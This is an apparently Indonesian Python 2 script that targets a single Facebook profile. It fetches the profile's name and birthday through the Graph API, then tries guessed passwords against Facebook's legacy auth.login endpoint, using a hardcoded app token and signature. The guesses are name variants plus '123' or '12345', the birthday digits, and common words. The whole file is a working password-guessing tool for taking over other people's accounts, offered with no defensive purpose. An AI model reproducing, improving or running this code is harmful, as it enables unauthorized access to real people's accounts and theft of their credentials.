# -*- coding: utf-8 -*-
import sys
from login import logo
sys.path.insert (0, "..")
from warna import *


logo()
toket = open ("Token.txt", "r").read()
user = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
try:
	jl = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ toket).text)
	print h +"✔ Nama "+ n +": "+ h + jl["name"]
	try:
		pass1 = jl["first_name"] +"123"
		at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass1) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
		if "access_token" in at:
			print h +"✔ "+ user + u +" | "+ h + pass1 + u +" => "+ n + jl["name"]
			enter()
		elif "www.facebook.com" in at["error_msg"]:
			print m +"✘ "+ user + u +" | "+ m + pass1 + u +" => "+ n + jl["name"]
			enter()
		else:
			pass2 = jl["first_name"] +"12345"
			at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass2) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
			if "access_token" in at:
				print h +"✔ "+ user + u +" | "+ h + pass2 + u +" => "+ n + jl["name"]
				enter()
			elif "www.facebook.com" in at["error_msg"]:
				print m +"✘ "+ user + u +" | "+ m + pass2 + u +" => "+ n + jl["name"]
				enter()
			else:
				pass3 = jl["middle_name"] +"123"
				at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass3) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
				if "access_token" in at:
					print h +"✔ "+ user + u +" | "+ h + pass3 + u +" => "+ n + jl["name"]
					enter()
				elif "www.facebook.com" in at["error_msg"]:
					print m +"✘ "+ user + u +" | "+ m + pass3 + u +" => "+ n + jl["name"]
					enter()
				else:
					pass4 = jl["middle_name"] +"12345"
					at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass4) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
					if "access_token" in at:
						print h +"✔ "+ user + u +" | "+ h + pass4 + u +" => "+ n + jl["name"]
						enter()
					elif "www.facebook.com" in at["error_msg"]:
						print m +"✘ "+ user + u +" | "+ m + pass4 + u +" => "+ n + jl["name"]
						enter()
					else:
						pass5 = jl["last_name"] +"123"
						at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass5) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
						if "access_token" in at:
							print h +"✔ "+ user + u +" | "+ h + pass5 + u +" => "+ n + jl["name"]
							enter()
						elif "www.facebook.com" in at["error_msg"]:
							print m +"✘ "+ user + u +" | "+ m + pass5 + u +" => "+ n + jl["name"]
							enter()
						else:
							pass6 = jl["last_name"] +"12345"
							at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass6) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
							if "access_token" in at:
								print h +"✔ "+ user + u +" | "+ h + pass6 + u +" => "+ n + jl["name"]
								enter()
							elif "www.facebook.com" in at["error_msg"]:
								print m +"✘ "+ user + u +" | "+ m + pass6 + u +" => "+ n + jl["name"]
								enter()
							else:
								lahir = jl["birthday"]
								pass7 = lahir.replace ("/", "")
								at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass7) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
								if "access_token" in at:
									print h +"✔ "+ user + u +" | "+ h + pass7 + u +" => "+ n + jl["name"]
									enter()
								elif "www.facebook.com" in at["error_msg"]:
									print m +"✘ "+ user + u +" | "+ m + pass7 + u +" => "+ n + jl["name"]
									enter()
								else:
									pass8 = "sayang"
									at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass8) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
									if "access_token" in at:
										print h +"✔ "+ user + u +" | "+ h + pass8 + u +" => "+ n + jl["name"]
										enter()
									elif "www.facebook.com" in at["error_msg"]:
										print m +"✘ "+ user + u +" | "+ m + pass8 + u +" => "+ n + jl["name"]
										enter()
									else:
										pass9 = "sayang123"
										at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass9) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
										if "access_token" in at:
											print h +"✔ "+ user + u +" | "+ h + pass9 + u +" => "+ n + jl["name"]
											enter()
										elif "www.facebook.com" in at["error_msg"]:
											print m +"✘ "+ user + u +" | "+ m + pass9 + u +" => "+ n + jl["name"]
											enter()
										else:
											pass10 = "anjing"
											at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass10) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
											if "access_token" in at:
												print h +"✔ "+ user + u +" | "+ h + pass10 + u +" => "+ n + jl["name"]
												enter()
											elif "www.facebook.com" in at["error_msg"]:
												print m +"✘ "+ user + u +" | "+ m + pass10 + u +" => "+ n + jl["name"]
												enter()
											else:
												pass11 = "anjing123"
												at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass11) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
												if "access_token" in at:
													print h +"✔ "+ user + u +" | "+ h + pass11 + u +" => "+ n + jl["name"]
													enter()
												elif "www.facebook.com" in at["error_msg"]:
													print m +"✘ "+ user + u +" | "+ m + pass11 + u +" => "+ n + jl["name"]
													enter()
												else:
													print m +"✘ Gagal Membuka Kata Sandi Dari "+ tebal + jl["name"] + n
													sleep (5)
	
	
	except KeyError:
		print m +"✘ Gagal Membuka Kata Sandi Dari "+ tebal + jl["name"] + n
		sleep (5)


except KeyError:
	print m +"✘ Id Profil Tidak Ditemukan"
	sleep (5)